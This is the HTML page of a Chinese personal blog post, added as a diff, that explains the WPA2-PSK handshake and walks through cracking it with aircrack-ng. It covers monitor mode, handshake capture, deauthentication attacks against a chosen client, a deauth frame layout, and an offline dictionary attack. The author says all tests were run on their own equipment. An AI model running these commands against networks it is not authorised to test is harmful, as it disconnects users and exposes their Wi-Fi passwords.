@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Linux使用aircrack-ng攻击WPA2-PSK | kusurin.blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="原理WPA2-PSK认证模式如图，在WPA2-PSK认证过程的四次握手中，PTK的一部分用于生成MIC(Message Integrity Check)，而$$ PTK &#x3D; \text{PRF}(PMK + ANONCE + SNONCE + MAC(AA) + MAC(SA)) $$(PTK:Pairwise Transient Key,PRF:Pseudorandom Functio">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux使用aircrack-ng攻击WPA2-PSK">
+<meta property="og:url" content="https://username.github.io/kusurin/blog/2023/11/27/wpa2psk-aircrack/index.html">
+<meta property="og:site_name" content="kusurin.blog">
+<meta property="og:description" content="原理WPA2-PSK认证模式如图，在WPA2-PSK认证过程的四次握手中，PTK的一部分用于生成MIC(Message Integrity Check)，而$$ PTK &#x3D; \text{PRF}(PMK + ANONCE + SNONCE + MAC(AA) + MAC(SA)) $$(PTK:Pairwise Transient Key,PRF:Pseudorandom Functio">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/4-way-handshake.svg/393px-4-way-handshake.svg.png">
+<meta property="article:published_time" content="2023-11-26T16:47:16.000Z">
+<meta property="article:modified_time" content="2023-11-26T16:48:49.370Z">
+<meta property="article:author" content="kusurin">
+<meta property="article:tag" content="WPA2">
+<meta property="article:tag" content="网安">
+<meta property="article:tag" content="杂谈">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/4-way-handshake.svg/393px-4-way-handshake.svg.png">
+  
+    <link rel="alternate" href="/blog/atom.xml" title="kusurin.blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/blog/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/blog/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/blog/" id="logo">kusurin.blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/blog/">Home</a>
+        
+          <a class="main-nav-link" href="/blog/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/blog/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://username.github.io/kusurin/blog"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-wpa2psk-aircrack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/blog/2023/11/27/wpa2psk-aircrack/" class="article-date">
+  <time class="dt-published" datetime="2023-11-26T16:47:16.000Z" itemprop="datePublished">2023-11-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/blog/categories/%E7%BD%91%E5%AE%89/">网安</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Linux使用aircrack-ng攻击WPA2-PSK
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="WPA2-PSK认证模式"><a href="#WPA2-PSK认证模式" class="headerlink" title="WPA2-PSK认证模式"></a>WPA2-PSK认证模式</h2><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/4-way-handshake.svg/393px-4-way-handshake.svg.png" alt="img"><br>如图，在WPA2-PSK认证过程的四次握手中，PTK的一部分用于生成<strong>MIC</strong>(Message Integrity Check)，而<br><br>$$ PTK &#x3D; \text{PRF}(PMK + ANONCE + SNONCE + MAC(AA) + MAC(SA)) $$<br>(<strong>PTK</strong>:Pairwise Transient Key,<strong>PRF</strong>:Pseudorandom Function,<strong>PMK</strong>:Pairwise Master Key,<strong>Nonce</strong>:仅使用一次的随机数)<br><br>其中PMK由PSK派生，而<br><br>$$ PSK&#x3D;\text{pdkdf2}(passphrase,SSID,SSID \space length,4096) $$<br>(<strong>PSK</strong>:Pre-Shared Key,<strong>pdkdf2</strong>:Passphrase-Based Key Derivation Function 2)<br><br>于是，如果我们监听到了握手包，则可以获取SSID、二者MAC、ANonce、SNonce、MIC，便可以将其用于验证猜测的密码(passphrase)是否正确，进行离线攻击。  </p>
+<h2 id="取消认证攻击"><a href="#取消认证攻击" class="headerlink" title="取消认证攻击"></a>取消认证攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint8_t deauthPacket[26] = &#123;</span><br><span class="line">    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)</span><br><span class="line">    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)</span><br><span class="line">    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)</span><br><span class="line">    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)</span><br><span class="line">    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)</span><br><span class="line">    /* 22 - 23 */ 0x00, 0x00,                         // fragment &amp; squence number</span><br><span class="line">    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>取消认证帧的结构如上，如果获取到了AP和客户端的信息，就可以伪造取消认证帧，进行取消认证攻击，令连接断开，然后在客户端尝试和AP重连时获取用于离线攻击的握手包。</p>
+<h2 id="aircrack-ng文档"><a href="#aircrack-ng文档" class="headerlink" title="aircrack-ng文档"></a>aircrack-ng文档</h2><p>相关命令的文档在：<br><a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/doku.php?id=airodump-ng">airodump-ng</a><br><a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/doku.php?id=aireplay-ng">aireplay-ng</a><br><a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/doku.php?id=aircrack-ng">aircrack-ng</a>  </p>
+<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="安装aircrack-ng"><a href="#安装aircrack-ng" class="headerlink" title="安装aircrack-ng"></a>安装aircrack-ng</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install aircrack-ng</span><br></pre></td></tr></table></figure>
+<h2 id="扫描AP"><a href="#扫描AP" class="headerlink" title="扫描AP"></a>扫描AP</h2><p>将网卡(interface)设置为<code>monitor</code>模式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip link set [interface name] down</span><br><span class="line">iwconfig [interface name] mode monitor</span><br><span class="line">ip link set [interface name] up</span><br></pre></td></tr></table></figure>
+<p>执行<code>iwconfig</code>确认相应网卡模式已经更改为<code>monitor</code>。<br>然后扫描周围AP，可以在其中寻找目标：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng [interface name]</span><br></pre></td></tr></table></figure>
+<p>列表中的<code>ENC</code>是加密方式，<code>CH</code>是信道(channel)。</p>
+<h2 id="监听握手包"><a href="#监听握手包" class="headerlink" title="监听握手包"></a>监听握手包</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -write [pack name] -channel [channel] -bssid [AP bssid] [interface name]</span><br></pre></td></tr></table></figure>
+<p><code>[pack name]</code>是输出握手包的文件名，建议专门弄个文件夹玩…<br>当出现提示<code>handshake pack</code>即已获取到握手包。</p>
+<h2 id="取消认证攻击-1"><a href="#取消认证攻击-1" class="headerlink" title="取消认证攻击"></a>取消认证攻击</h2><p>但是，握手包不一定监听得到，可以进行取消认证攻击令客户端与AP重连：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -deauth [count] -a [AP bssid] -c [client bssid] [interface name]</span><br></pre></td></tr></table></figure>
+<p><code>[count]</code>为攻击次数。</p>
+<h2 id="离线字典攻击"><a href="#离线字典攻击" class="headerlink" title="离线字典攻击"></a>离线字典攻击</h2><p>获取到握手包后，我们需要输出的<code>.cap</code>文件，使用<code>aircrack-ng</code>进行字典攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w [wordlist] [pack name].cap</span><br></pre></td></tr></table></figure>
+<p>字典(wordlist)可以在这里获取：<a target="_blank" rel="noopener" href="https://github.com/kennyn510/wpa2-wordlists">wpa2-wordlists</a>。</p>
+<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>实验均在本人设备上、对本人设备进行，未进行非法攻击。  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://username.github.io/kusurin/blog/2023/11/27/wpa2psk-aircrack/" data-id="clpfq5ql70001v8wp5jj4azeb" data-title="Linux使用aircrack-ng攻击WPA2-PSK" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/WPA2/" rel="tag">WPA2</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/%E6%9D%82%E8%B0%88/" rel="tag">杂谈</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/blog/tags/%E7%BD%91%E5%AE%89/" rel="tag">网安</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/blog/2023/11/27/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/%E7%BD%91%E5%AE%89/">网安</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/WPA2/" rel="tag">WPA2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/%E6%9D%82%E8%B0%88/" rel="tag">杂谈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/blog/tags/%E7%BD%91%E5%AE%89/" rel="tag">网安</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/blog/tags/WPA2/" style="font-size: 10px;">WPA2</a> <a href="/blog/tags/%E6%9D%82%E8%B0%88/" style="font-size: 10px;">杂谈</a> <a href="/blog/tags/%E7%BD%91%E5%AE%89/" style="font-size: 10px;">网安</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2023/11/">十一月 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/blog/2023/11/27/wpa2psk-aircrack/">Linux使用aircrack-ng攻击WPA2-PSK</a>
+          </li>
+        
+          <li>
+            <a href="/blog/2023/11/27/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 kusurin<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/blog/" class="mobile-nav-link">Home</a>
+  
+    <a href="/blog/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/blog/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/blog/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/blog/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
